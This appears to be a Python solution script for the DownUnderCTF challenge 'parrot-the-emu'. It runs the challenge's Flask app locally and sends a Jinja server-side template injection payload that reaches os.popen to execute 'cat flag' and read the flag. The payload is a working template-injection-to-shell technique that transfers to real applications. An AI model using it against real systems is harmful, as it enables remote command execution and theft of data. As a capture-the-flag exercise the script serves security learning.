#!/usr/bin/env python3
"""Solve DownUnderCTF `parrot-the-emu` -- textbook SSTI.

Recon: the Flask app feeds POSTed `user_input` directly to
`render_template_string` and echoes the result back ("the emu parrots
anything"). No filter at all.

Clue: `{{7*7}}` rendering `49` confirms SSTI. From there the standard chain
reaches os via a Jinja global's `__globals__` and runs a shell command; the
result is parroted straight back in the response, so we just read the flag
file.

We run the app LOCALLY (its own code binds port 80; we import its `app` object
and bind a high port on 127.0.0.1 instead) and never touch a remote host.

Fetch first:  python challenges/fetch.py parrot-the-emu
"""
import os
import re
import subprocess
import sys
import time

import requests

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
APP = os.path.join(REPO, "challenges", "parrot-the-emu", "src", "main-app")
PORT = 8099
PAYLOAD = '{{cycler.next.__globals__.os.popen("cat flag").read()}}'

RUNNER = (
    "import sys; sys.path.insert(0, '.'); import app; "
    f"app.app.run(host='127.0.0.1', port={PORT}, use_reloader=False)"
)


def main() -> None:
    srv = subprocess.Popen(
        [sys.executable, "-c", RUNNER],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, cwd=APP,
    )
    try:
        time.sleep(2)
        r = requests.post(
            f"http://127.0.0.1:{PORT}/", data={"user_input": PAYLOAD}, timeout=5
        )
        match = re.search(r"DUCTF\{[^}]*\}", r.text)
        print("FLAG:", match.group(0) if match else "not found")
    finally:
        srv.terminate()
        srv.wait()


if __name__ == "__main__":
    main()
